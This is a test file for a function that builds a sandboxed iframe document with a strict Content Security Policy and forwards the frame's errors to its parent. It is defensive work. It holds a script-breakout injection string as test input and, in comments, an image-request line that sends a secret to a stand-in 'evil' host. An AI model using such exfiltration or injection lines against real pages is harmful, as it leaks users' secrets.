// SPDX-FileCopyrightText: 2026 quissicutdeus
//
// SPDX-License-Identifier: AGPL-3.0-or-later

import { describe, it, expect, vi } from 'vitest';
import { srcdocFor } from './srcdoc';

/**
 * The frame's error listeners, run for real: the text of the document's first classic
 * script, executed against a stand-in `window`, `parent` and `console`. jsdom never runs a
 * `srcdoc`, so this runs the exact text the frame would.
 */
function frameListeners() {
  const html = srcdocFor('export {};');
  const script = /<script>([\s\S]*?)<\/script>/.exec(html);
  if (!script) throw new Error('no classic script in the document');
  const listeners = new Map<string, (event: unknown) => void>();
  const posted: { message: unknown; origin: string }[] = [];
  const logged: unknown[][] = [];
  const frameWindow = {
    addEventListener: (type: string, listener: (event: unknown) => void) => {
      listeners.set(type, listener);
    }
  };
  const frameParent = {
    postMessage: (message: unknown, origin: string) => posted.push({ message, origin })
  };
  const frameConsole = { error: (...args: unknown[]) => logged.push(args) };
  // eslint-disable-next-line @typescript-eslint/no-implied-eval -- the point is to run the emitted text
  const run = new Function('window', 'parent', 'console', script[1]) as (
    w: typeof frameWindow,
    p: typeof frameParent,
    c: typeof frameConsole
  ) => void;
  run(frameWindow, frameParent, frameConsole);
  /** Dispatch a stand-in event of `type` to the listener the script registered for it. */
  const fire = (type: string, init: Record<string, unknown>) => {
    const listener = listeners.get(type);
    if (!listener) throw new Error(`no '${type}' listener`);
    const event = { preventDefault: vi.fn(), ...init };
    listener(event);
    return event;
  };
  return { listeners, posted, logged, fire, html };
}

describe('srcdocFor', () => {
  it('produces a document with a root and no allow-same-origin dependency', () => {
    const html = srcdocFor('console.log(1)');
    expect(html).toContain('<div id="app">');
    expect(html).toContain('<script type="module">');
  });

  it('inlines the code directly, not as a data: URL', () => {
    const code = 'export const x = 1;';
    const html = srcdocFor(code);
    expect(html).not.toContain('data:text/javascript');
    expect(html).toContain(`<script type="module">${code}</script>`);
  });

  it('stays within ~5% of the source size, not the ~3x a data: URL would cost', () => {
    const code = 'x'.repeat(10000);
    const html = srcdocFor(code);
    expect(html.length).toBeLessThan(code.length * 1.05 + 1000);
  });

  it('does not let a `</script>` inside the code terminate the outer script', () => {
    const code = 'const s = "</script><script>alert(1)</script>";';
    const html = srcdocFor(code);
    // Two script tags belong to the document itself (the fallback error listener,
    // and the module script). None of the extra closes come from inside the code.
    const scriptCloses = html.match(/<\/script>/g) ?? [];
    expect(scriptCloses).toHaveLength(2);
  });

  /**
   * MICA-24 set `connect-src` and nothing else; MICA-196 put a `default-src 'none'`
   * floor under it, because `connect-src` is not the only way out of the frame. The
   * directive-by-directive reasoning is in `srcdoc.ts` — these assert the policy text.
   */
  describe('the content security policy', () => {
    /** The `content="..."` of the one CSP meta, as the browser would parse it. */
    const policy = (html: string): string[] => {
      const meta = /<meta http-equiv="Content-Security-Policy" content="([^"]*)">/.exec(html);
      if (!meta) throw new Error('no CSP meta in the document');
      return meta[1].split('; ');
    };

    it('blocks outbound fetch entirely when no hosts are given', () => {
      expect(policy(srcdocFor('x'))).toContain("connect-src 'none'");
    });

    it('blocks outbound fetch entirely for an explicitly empty list, same as none', () => {
      expect(policy(srcdocFor('x', []))).toContain("connect-src 'none'");
    });

    it('allows exactly the declared origins, space-separated', () => {
      const html = srcdocFor('x', ['https://api.example.com', 'https://cdn.example.com:8443']);
      expect(policy(html)).toContain(
        'connect-src https://api.example.com https://cdn.example.com:8443'
      );
    });

    it('places the CSP meta before any script tag, so it governs the whole document', () => {
      const html = srcdocFor('x', ['https://api.example.com']);
      expect(html.indexOf('Content-Security-Policy')).toBeLessThan(html.indexOf('<script'));
    });

    /**
     * The floor, and the reason a declared `connect-src` is worth anything: without it an
     * unset `img-src`/`frame-src`/`form-action` is three unpoliced doors beside the one
     * door MICA-24 locked.
     */
    it('refuses everything not named, and shuts every non-connect exit', () => {
      const directives = policy(srcdocFor('x', ['https://api.example.com']));
      expect(directives).toContain("default-src 'none'");
      // A nested `<iframe src="https://evil">` inherits the sandbox but not the CSP —
      // CSP inherits only for local schemes — so the child would run unpoliced.
      expect(directives).toContain("frame-src 'none'");
      // `child-src` is `worker-src`'s fallback as well as `frame-src`'s.
      expect(directives).toContain("child-src 'none'");
      // A form POST is a navigation, which `connect-src` does not govern.
      expect(directives).toContain("form-action 'none'");
      expect(directives).toContain("base-uri 'none'");
    });

    /** One directive's sources, split the way a browser tokenizes them. */
    const sources = (directives: string[], name: string): string[] => {
      const value = directives.find((d) => d.startsWith(`${name} `));
      if (value === undefined) throw new Error(`no ${name} in the policy`);
      return value.split(' ').slice(1);
    };

    /**
     * MICA-442: the bundle is inline, so inline is what `script-src`/`style-src` must admit
     * — get that wrong and every add-on breaks at once, since the module script would never
     * run. What they no longer admit is a script or stylesheet from any host the manifest
     * did not name, which was every `https:` and `http:` host until this ticket.
     */
    it('lets scripts and styles run inline and load only from data: and blob: when nothing is declared', () => {
      for (const html of [srcdocFor('x'), srcdocFor('x', [])]) {
        const directives = policy(html);
        // The inlined module and the fallback error listener are both inline scripts.
        expect(directives).toContain("script-src 'unsafe-inline' 'unsafe-eval' data: blob:");
        // The add-on build injects its CSS as a `<style>`, and Svelte may inject more.
        expect(directives).toContain("style-src 'unsafe-inline' data: blob:");
      }
    });

    it('scopes script and style loads to the declared hosts, exactly as connect-src is', () => {
      const directives = policy(
        srcdocFor('x', ['https://api.example.com', 'https://cdn.example.com:8443'])
      );
      expect(directives).toContain(
        "script-src 'unsafe-inline' 'unsafe-eval' data: blob: https://api.example.com https://cdn.example.com:8443"
      );
      expect(directives).toContain(
        "style-src 'unsafe-inline' data: blob: https://api.example.com https://cdn.example.com:8443"
      );
    });

    it('admits no bare scheme that would let a script or stylesheet come from an undeclared host', () => {
      for (const html of [
        srcdocFor('x'),
        srcdocFor('x', ['https://api.example.com']),
        srcdocFor('x', ['https://api.example.com'], ['https://img.example.test'])
      ]) {
        const directives = policy(html);
        for (const directive of ['script-src', 'style-src']) {
          const list = sources(directives, directive);
          // `https:` alone is every https host on the internet, and `http:` every
          // plaintext one; both were here from MICA-196 until MICA-442.
          expect(list).not.toContain('https:');
          expect(list).not.toContain('http:');
          // The frame's origin is opaque, so `'self'` would match nothing.
          expect(list).not.toContain("'self'");
          // Every source is a keyword, a local scheme, or an exact declared origin.
          for (const source of list) {
            expect(source).toMatch(/^('unsafe-inline'|'unsafe-eval'|data:|blob:|https:\/\/.+)$/);
          }
        }
      }
    });

    /** The image host is for drawing photos (MICA-243), never for running code. */
    it('keeps the image host out of script-src and style-src', () => {
      const directives = policy(
        srcdocFor('x', ['https://api.example.com'], ['https://img.example.test'])
      );
      expect(sources(directives, 'script-src')).not.toContain('https://img.example.test');
      expect(sources(directives, 'style-src')).not.toContain('https://img.example.test');
      expect(sources(directives, 'script-src')).toContain('https://api.example.com');
      expect(sources(directives, 'style-src')).toContain('https://api.example.com');
    });

    /**
     * MICA-202: a subresource load is an outbound request like any other. Before this,
     * `img-src https:` left `new Image().src = 'https://evil/?' + secret` open to every
     * add-on regardless of what it declared; `srcdoc.ts` has the audit that found nothing
     * the phone hands an add-on needs it.
     */
    it('scopes images, media and fonts to data:, blob: and the declared hosts', () => {
      const directives = policy(
        srcdocFor('x', ['https://api.example.com', 'https://cdn.example.com:8443'])
      );
      for (const directive of ['img-src', 'media-src', 'font-src']) {
        expect(directives).toContain(
          `${directive} data: blob: https://api.example.com https://cdn.example.com:8443`
        );
      }
    });

    it('lets images, media and fonts load only from data: and blob: when nothing is declared', () => {
      for (const html of [srcdocFor('x'), srcdocFor('x', [])]) {
        const directives = policy(html);
        expect(directives).toContain('img-src data: blob:');
        expect(directives).toContain('media-src data: blob:');
        expect(directives).toContain('font-src data: blob:');
      }
    });

    it('admits no bare scheme that would let a subresource reach an undeclared host', () => {
      const directives = policy(srcdocFor('x', ['https://api.example.com']));
      for (const directive of ['img-src', 'media-src', 'font-src']) {
        const value = directives.find((d) => d.startsWith(`${directive} `));
        expect(value).toBeDefined();
        // `https:` alone is every https host on the internet; `http:` was never here.
        expect(value?.split(' ')).not.toContain('https:');
        expect(value?.split(' ')).not.toContain('http:');
        expect(value?.split(' ')).not.toContain("'self'");
      }
    });

    /**
     * MICA-243: a server that hosts its photos hands add-ons `https:` URLs on one origin.
     * That origin reaches `img-src` and nothing else — an add-on may draw a hosted photo,
     * and may not `fetch` the host, play media from it or load a font from it.
     */
    it('adds the image host to img-src and to no other directive', () => {
      const directives = policy(
        srcdocFor('x', ['https://api.example.com'], ['https://img.example.test'])
      );
      expect(directives).toContain(
        'img-src data: blob: https://api.example.com https://img.example.test'
      );
      expect(directives).toContain('connect-src https://api.example.com');
      expect(directives).toContain('media-src data: blob: https://api.example.com');
      expect(directives).toContain('font-src data: blob: https://api.example.com');
    });

    it('keeps connect-src shut when the image host is the only host', () => {
      const directives = policy(srcdocFor('x', [], ['https://img.example.test']));
      expect(directives).toContain("connect-src 'none'");
      expect(directives).toContain('img-src data: blob: https://img.example.test');
      expect(directives).toContain('media-src data: blob:');
    });

    it('emits exactly one CSP meta, so no directive is silently duplicated', () => {
      const html = srcdocFor('x', ['https://api.example.com']);
      expect(html.match(/http-equiv="Content-Security-Policy"/g)).toHaveLength(1);
    });
  });

  /**
   * MICA-469. In Chromium 103 an error reported as uncaught keeps its exception object, and
   * through it the frame's window and document, alive after the frame is removed: every
   * crashed add-on stayed in memory for the session. Cancelling the event is what releases
   * it, and the shell must still hear about the crash. `srcdoc.ts` has the measurement.
   */
  describe("the frame's error listeners", () => {
    /** Every argument of every `console.error` call is a string, never an object. */
    const allText = (logged: unknown[][]) => logged.flat().every((a) => typeof a === 'string');

    it('cancels an uncaught error, forwards it to the shell, and logs it as text', () => {
      const { fire, posted, logged } = frameListeners();
      const error = new Error('boom');

      const event = fire('error', { error, message: 'Uncaught Error: boom' });

      expect(event.preventDefault).toHaveBeenCalledTimes(1);
      expect(posted).toEqual([
        { message: { kind: 'error', message: 'boom', stack: error.stack }, origin: '*' }
      ]);
      expect(logged).toEqual([[`Uncaught ${error.stack}`]]);
      expect(allText(logged)).toBe(true);
    });

    it('does the same for an unhandled rejection', () => {
      const { fire, posted, logged } = frameListeners();
      const reason = new Error('nope');

      const event = fire('unhandledrejection', { reason });

      expect(event.preventDefault).toHaveBeenCalledTimes(1);
      expect(posted).toEqual([
        { message: { kind: 'error', message: 'nope', stack: reason.stack }, origin: '*' }
      ]);
      expect(logged).toEqual([[`Uncaught (in promise) ${reason.stack}`]]);
      expect(allText(logged)).toBe(true);
    });

    it('forwards a thrown value that is not an Error by its text, with no stack', () => {
      const { fire, posted, logged } = frameListeners();

      fire('unhandledrejection', { reason: 'plain' });
      // A cross-origin script error arrives with no error object, only the message.
      fire('error', { error: null, message: 'Script error.' });

      expect(posted.map((p) => p.message)).toEqual([
        { kind: 'error', message: 'plain', stack: null },
        { kind: 'error', message: 'Script error.', stack: null }
      ]);
      expect(logged).toEqual([['Uncaught (in promise) plain'], ['Uncaught Script error.']]);
    });

    it('still cancels and forwards when reading the thrown value throws', () => {
      const { fire, posted, logged } = frameListeners();
      const hostile = {
        get message(): string {
          throw new Error('no');
        }
      };

      const event = fire('unhandledrejection', { reason: hostile });

      expect(event.preventDefault).toHaveBeenCalledTimes(1);
      expect(posted.map((p) => p.message)).toEqual([
        { kind: 'error', message: 'unknown error', stack: null }
      ]);
      expect(logged).toEqual([['Uncaught (in promise) unknown error']]);
    });

    it('registers one listener per event, in a classic script ahead of the module', () => {
      const { listeners, html } = frameListeners();
      expect([...listeners.keys()].sort()).toEqual(['error', 'unhandledrejection']);
      // Classic, so it is live before the module parses and catches the module's own
      // syntax error; inline, which the policy's `'unsafe-inline'` admits.
      expect(html.indexOf('<script>')).toBeLessThan(html.indexOf('<script type="module">'));
      expect(html).toMatch(/script-src 'unsafe-inline'/);
    });
  });
});
